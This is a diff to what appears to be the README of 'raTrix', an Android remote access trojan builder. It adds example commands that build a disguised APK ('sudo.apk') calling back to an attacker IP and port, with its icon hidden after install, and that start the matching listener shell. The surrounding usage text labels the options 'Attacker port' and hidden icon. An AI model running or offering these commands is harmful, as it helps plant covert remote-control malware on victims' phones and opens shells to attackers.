@@ -40,6 +40,8 @@ modules:
     -p, --port              Attacker port number (required)
     -o, --output            Name for the apk file (optional)
     -icon, --icon           Visible icon after installing apk (by default set to hidden)
+
+EXample: python3 raTrix.py --build -i 192.168.16.216 -p 443 -o sudo.apk
 ```
 
 # Usages SHELL mode
@@ -49,6 +51,8 @@ Usage:
   modules:
     -i, --ip                Listner IP address
     -p, --port              Listner port number
+
+Example: python3 raTrix.py --shell -i 192.168.16.216 -p 443
 ```
 # Commands in shell mode
 ```
